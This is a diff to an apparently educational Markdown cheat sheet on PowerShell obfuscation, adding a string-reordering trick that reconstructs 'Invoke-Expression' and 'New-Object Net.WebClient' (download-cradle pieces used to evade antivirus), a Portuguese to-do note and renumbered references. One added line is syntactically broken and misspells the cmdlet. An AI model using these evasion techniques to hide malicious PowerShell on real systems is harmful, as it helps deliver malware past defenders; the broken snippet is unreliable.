@@ -294,6 +294,23 @@ from $env:comspec variable and use the **-Join ''** operator to take the array a
 
 ---
 
+- Using splatting + reorder
+
+      &("{0}{2}{1}{3}" -f'Invoke','es','-Expr','ion')
+      OUTPUT: Invoke-Expresion
+
+
+      (&( "" -f'(New','ject','-Ob') ( "{0}{2}{1}" -f'Net.','Client)','We'))
+      OUTPUT: (New-Object Net.WebClient)
+
+      ALL: Invoke-Expresion (New-Object Net.WebClient)
+
+---
+      escrever a agradecer ao daniel (pdf file)
+      LINK para o pdf file
+
+---
+
 <br /><br /><br /><br />
 
 ## C to ANCII Obfuscation
@@ -454,11 +471,12 @@ from $env:comspec variable and use the **-Join ''** operator to take the array a
 <br />
 
 ### Referencies
-https://twitter.com/404death<br />
-https://github.com/govolution/avepoc<br />
-https://github.com/danielbohannon/Invoke-Obfuscation<br />
-https://www.sans.org/summit-archives/file/summit-archive-1492186586.pdf<br />
-https://blog.varonis.com/powershell-obfuscation-stealth-through-confusion-part-i/<br />
+[1] https://twitter.com/404death<br />
+[2] https://github.com/govolution/avepoc<br />
+[3] https://www.sans.org/summit-archives/file/summit-archive-1492186586.pdf<br />
+[4] https://blog.varonis.com/powershell-obfuscation-stealth-through-confusion-part-i/<br />
+[5] http://www.danielbohannon.com/blog-1/2016/10/1/invoke-obfuscation-v11-release-sunday-oct-9<br />
+[6] http://www.danielbohannon.com/blog-1/2017/3/12/powershell-execution-argument-obfuscation-how-it-can-make-detection-easier<br />
 
 <br />
 
